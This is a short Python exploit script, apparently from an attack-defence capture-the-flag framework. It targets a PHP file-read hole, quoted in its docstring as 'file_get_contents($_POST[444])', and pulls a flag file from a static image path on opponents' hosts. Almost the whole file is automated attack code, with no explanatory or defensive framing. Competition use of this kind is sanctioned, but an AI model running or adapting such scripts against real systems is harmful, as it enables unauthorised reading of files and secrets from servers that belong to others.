#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	echo file_get_contents($_POST[444]);

	'''

	try:
		cmd = flag_path
		data = quote(cmd) 
		#res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
		res = shit(target,target_port)
		# Even though we can not execute the cmd with the vuln, but we can read flag
		# and we want to use our framework to carry out this attack
		# not do the replicate tasks to code a new script
		if len(res) < 40:
			res = cmd_prefix + res + cmd_postfix
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res

def shit(target,target_port):
	s = requests.Session()
	ip = target
	url = 'http://%s:%s/collectedstatic/assets/img/1.png' % (ip,str(target_port))

	flag = s.get(url).content
	print flag
	
	if len(flag)<40:
		debug_print(flag)
	else:
		flag = 'get flag error'
	
	return flag
